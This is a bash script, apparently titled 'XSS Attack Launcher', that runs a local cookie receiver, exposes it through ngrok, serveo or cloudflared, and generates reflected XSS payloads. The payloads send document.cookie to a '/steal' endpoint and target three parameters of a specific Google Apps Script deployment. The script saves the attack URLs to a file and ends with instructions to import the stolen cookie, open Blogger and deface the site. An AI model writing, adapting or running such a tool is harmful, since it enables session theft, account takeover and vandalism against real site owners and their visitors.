#!/bin/bash

echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║              XSS Attack Launcher - Quick Setup                    ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo ""

# Check if ngrok is installed
if command -v ngrok &> /dev/null; then
    echo "✓ ngrok found"
else
    echo "⚠ ngrok not found. Install from: https://ngrok.com/download"
    echo "  Or use cloudflared tunnel instead"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 1: Start Cookie Receiver"
echo "═══════════════════════════════════════════════════════════════════"
echo ""

read -p "Start cookie receiver now? (y/n): " start_receiver

if [ "$start_receiver" = "y" ]; then
    echo ""
    echo "[*] Starting cookie receiver on port 8080..."
    echo "[*] Press Ctrl+C in receiver window to stop"
    echo ""
    
    # Start receiver in background
    python3 cookie_receiver.py &
    RECEIVER_PID=$!
    
    sleep 2
    
    echo ""
    echo "═══════════════════════════════════════════════════════════════════"
    echo "  STEP 2: Get Public URL"
    echo "═══════════════════════════════════════════════════════════════════"
    echo ""
    echo "Choose tunneling option:"
    echo "1. ngrok (recommended)"
    echo "2. serveo.net (no install needed)"
    echo "3. cloudflared"
    echo "4. Skip (I'll do it manually)"
    echo ""
    
    read -p "Choice [1-4]: " tunnel_choice
    
    case $tunnel_choice in
        1)
            echo ""
            echo "[*] Starting ngrok..."
            echo "[*] Copy the HTTPS URL when it appears"
            echo ""
            ngrok http 8080
            ;;
        2)
            echo ""
            echo "[*] Starting serveo.net tunnel..."
            echo "[*] Copy the HTTPS URL when it appears"
            echo ""
            ssh -R 80:localhost:8080 serveo.net
            ;;
        3)
            echo ""
            echo "[*] Starting cloudflared..."
            cloudflared tunnel --url localhost:8080
            ;;
        4)
            echo ""
            echo "[*] Receiver running on http://localhost:8080"
            echo "[*] Setup your own tunnel manually"
            echo ""
            read -p "Press Enter when done..."
            ;;
    esac
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 3: Test XSS Payloads"
echo "═══════════════════════════════════════════════════════════════════"
echo ""

read -p "Enter your public URL (e.g., https://abc123.ngrok.io): " PUBLIC_URL

if [ ! -z "$PUBLIC_URL" ]; then
    echo ""
    echo "✓ Public URL: $PUBLIC_URL"
    echo ""
    echo "📋 XSS Test URLs (open in browser):"
    echo ""
    
    BASE="https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec"
    
    # URL encode the payload
    PAYLOAD="<img src=x onerror=\"fetch('$PUBLIC_URL/steal?c='+document.cookie+'&u='+location.href)\">"
    
    echo "1. Search endpoint:"
    echo "   ${BASE}?page=search&query=${PAYLOAD}"
    echo ""
    echo "2. Talk endpoint:"
    echo "   ${BASE}?page=talk&message=${PAYLOAD}"
    echo ""
    echo "3. Walas endpoint:"
    echo "   ${BASE}?page=walas&name=${PAYLOAD}"
    echo ""
    
    # Save to file
    cat > xss_test_urls.txt << EOF
XSS Test URLs - Generated $(date)

Public URL: $PUBLIC_URL

Test these URLs in browser:

1. ${BASE}?page=search&query=${PAYLOAD}

2. ${BASE}?page=talk&message=${PAYLOAD}

3. ${BASE}?page=walas&name=${PAYLOAD}

If cookie captured, check: stolen_cookies.txt
EOF
    
    echo "✅ URLs saved to: xss_test_urls.txt"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 4: Monitor for Captured Cookies"
echo "═══════════════════════════════════════════════════════════════════"
echo ""
echo "Cookie receiver is running. Monitor output for captures."
echo ""
echo "When cookie captured:"
echo "1. Check stolen_cookies.txt"
echo "2. Import cookie to browser (see guide Step 5B)"
echo "3. Access https://www.blogger.com"
echo "4. Deface site"
echo ""
echo "Press Ctrl+C to stop all services"
echo ""

# Keep script running
wait
